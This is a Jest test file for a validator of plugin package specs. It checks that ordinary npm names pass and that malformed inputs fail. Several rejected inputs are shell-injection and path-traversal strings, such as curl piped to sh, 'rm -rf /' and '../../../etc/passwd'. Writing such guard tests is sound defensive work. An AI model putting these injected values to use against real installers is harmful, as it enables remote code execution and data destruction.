import { describe, expect, it } from '@jest/globals';

import { assertValidPackageSpec, isValidPackageSpec } from '../validate-package-spec';

describe('isValidPackageSpec', () => {
  it.each([
    'lodash',
    '@scope/foo',
    'insomnia-plugin-themes',
    'foo@1.2.3',
    'foo@^1.2.3',
    '@scope/foo@~1.0.0',
    'lodash@1.0.0 || 2.0.0',
    'a-b_c.d',
  ])('allows legit spec %p', spec => {
    expect(isValidPackageSpec(spec)).toBe(true);
  });

  it.each([
    // Shell-metacharacter injection (the actual security issue this guards):
    'foo; curl evil|sh',
    'foo&&touch /tmp/pwn',
    'foo`evil`',
    'foo$(curl evil)',
    'foo${IFS}rm',
    'foo|sh',
    'foo>out',
    'foo bar',
    'foo\nbar',
    // Path traversal into tmpDir join:
    '../../../etc/passwd',
    '/etc/passwd',
    '.hidden',
    '_private',
    '@scope/../escape',
    // Empty / too long:
    '',
    'a'.repeat(300),
  ])('rejects malicious / malformed spec %p', spec => {
    expect(isValidPackageSpec(spec)).toBe(false);
  });

  it('rejects non-string input', () => {
    expect(isValidPackageSpec(undefined as unknown as string)).toBe(false);
    expect(isValidPackageSpec(null as unknown as string)).toBe(false);
    expect(isValidPackageSpec(42 as unknown as string)).toBe(false);
  });
});

describe('assertValidPackageSpec', () => {
  it('throws on malicious input', () => {
    expect(() => assertValidPackageSpec('foo; rm -rf /')).toThrow(/Invalid plugin package name/);
  });

  it('returns void on valid input', () => {
    expect(() => assertValidPackageSpec('lodash')).not.toThrow();
  });
});
